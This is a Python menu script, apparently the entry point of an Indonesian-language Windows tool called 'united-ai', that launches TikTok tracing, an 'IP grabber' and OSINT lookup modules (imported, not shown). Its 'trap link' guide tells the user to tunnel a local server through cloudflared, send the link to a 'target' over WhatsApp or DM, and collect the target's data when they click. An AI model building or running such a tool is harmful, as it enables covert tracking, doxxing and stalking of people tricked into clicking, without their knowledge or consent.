# united-ai | main entry (Windows Edition)
# Made by Nyxveil - Continued by Tebo Yang Mulia

import sys
import os

# Fix ANSI untuk Windows
if os.name == "nt":
    os.system("")

from ui import (clear, banner, menu_box, prompt, ok, err, info, warn,
                section, press_enter, C_CYAN, C_WHITE, C_RED, C_YELLOW, C_GREEN)
from verify import verify_all

def trap_guide():
    section("PANDUAN TRAP LINK")
    print(f"{C_WHITE}  1. Pilih menu {C_GREEN}[2]{C_WHITE} untuk start server")
    print(f"{C_WHITE}  2. Buka POWERSHELL BARU, jalankan:")
    print(f"{C_GREEN}     cloudflared tunnel --url http://localhost:8080")
    print(f"{C_WHITE}  3. Copy URL trycloudflare.com yang muncul")
    print(f"{C_WHITE}  4. Kirim URL ke target (WA / DM / dll)")
    print(f"{C_WHITE}  5. Target klik -> data masuk real-time di terminal menu [2]\n")
    print(f"{C_YELLOW}  [i] Install cloudflared: {C_GREEN}winget install --id Cloudflare.cloudflared\n")
    press_enter()

def main():
    clear()
    banner()
    verify_all()
    input(f"{C_YELLOW}  [>] Tekan ENTER untuk lanjut ke menu...")

    while True:
        clear()
        banner()
        menu_box()
        choice = prompt("Pilih menu [0-5]")

        if choice == "1":
            from modules.tiktok_trace import tiktok_osint
            tiktok_osint()
        elif choice == "2":
            from modules.ip_grabber import run_grabber
            run_grabber()
        elif choice == "3":
            from modules.osint_lookup import osint_menu
            osint_menu()
        elif choice == "4":
            trap_guide()
        elif choice == "5":
            verify_all()
            press_enter()
        elif choice == "0":
            print(f"{C_RED}\n  [!] Keluar. Sampai jumpa, Tebo Yang Mulia.\n")
            sys.exit(0)
        else:
            err("Pilihan tidak valid.")
            press_enter()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C_RED}  [!] Dihentikan paksa. Sampai jumpa.\n")
        sys.exit(0)
